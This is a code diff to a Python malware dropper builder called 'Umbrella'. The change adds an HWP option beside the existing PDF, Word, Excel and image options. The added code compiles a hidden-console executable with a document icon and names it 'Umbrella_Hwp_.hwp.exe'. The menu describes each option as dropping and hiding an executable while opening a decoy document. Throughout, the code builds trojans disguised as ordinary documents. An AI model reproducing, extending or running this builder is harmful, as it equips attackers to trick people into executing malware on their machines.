@@ -60,7 +60,8 @@ def gen():
     sys.stdout.write(WHITE + '\n[' + GREEN + '1' + WHITE + ']' + GREEN + ' PDF DROPPER' + WHITE + ' - Drop executable, hide it and open your custom pdf.')
     sys.stdout.write(WHITE + '\n[' + GREEN + '2' + WHITE + ']' + GREEN + ' WORD DROPPER' + WHITE + ' - Drop executable, hide it and open your custom docx.')    
     sys.stdout.write(WHITE + '\n[' + GREEN + '3' + WHITE + ']' + GREEN + ' EXCEL DROPPER' + WHITE + ' - Drop executable, hide it and open your custom xlsx.')
-    sys.stdout.write(WHITE + '\n[' + GREEN + '4' + WHITE + ']' + GREEN + ' IMAGE DROPPER' + WHITE + ' - Drop executable, hide it and open your custom jpg/png.\n' + END)
+    sys.stdout.write(WHITE + '\n[' + GREEN + '4' + WHITE + ']' + GREEN + ' IMAGE DROPPER' + WHITE + ' - Drop executable, hide it and open your custom jpg/png.')
+    sys.stdout.write(WHITE + '\n[' + GREEN + '5' + WHITE + ']' + GREEN + ' HWP DROPPER' + WHITE + ' - Drop executable, hide it and open your custom hwp.\n' + END)
 ########
 def pp():
     sys.stdout.write(GREEN + '''
@@ -95,6 +96,8 @@ def begin():
         nameph = randomword(10) + '.jpg'
     if 'png' in embed_d:
         nameph = randomword(10) + '.png'
+    if 'hwp' in embed_d:
+        nameph = randomword(10) + '.hwp'
     template = open('Templates/U_dRoP.py', 'r')
     o = template.read()
 
@@ -202,6 +205,21 @@ def main():
                 os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -i Icons/img.ico -F D.py')
                 os.system('rm -Rf build D.spec D.py')
                 name = 'Umbrella_Img_.jpg.exe'
+                os.rename('dist/D.exe', 'dist/' + name)
+                clear()
+                print '{0}[*] Done! Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
+                quit = raw_input('Do You want quit or back to main?(Q/B)')
+                if quit.upper() == 'Q':
+                    clear()
+                    pp()
+                    sys.exit(0)
+                elif quit.upper() == 'B':
+                    main()
+            elif choice == '5':
+                begin()
+                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -i Icons/hwp.ico -F D.py')
+                os.system('rm -Rf build D.spec D.py')
+                name = 'Umbrella_Hwp_.hwp.exe'
                 os.rename('dist/D.exe', 'dist/' + name)
                 clear()
                 print '{0}[*] Done! Saved to:  {1}'.format(GREEN, END) + 'dist/' + name
